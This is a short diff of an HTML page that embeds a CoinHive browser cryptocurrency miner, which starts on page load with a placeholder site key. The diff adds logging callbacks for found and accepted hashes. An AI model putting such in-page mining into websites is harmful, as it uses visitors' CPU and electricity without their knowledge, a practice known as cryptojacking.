@@ -12,6 +12,9 @@ Vie
 <script>
 var miner = new CoinHive.Anonymous('<site-key>');
 miner.start();
+  console.log("started");
+  miner.on('found', function() { /* Hash found */ console.log("hash fount");})
+miner.on('accepted', function() { /* Hash accepted by the pool */ console.log("Hash accepted by the pool");})
 </script>
 
 </body>
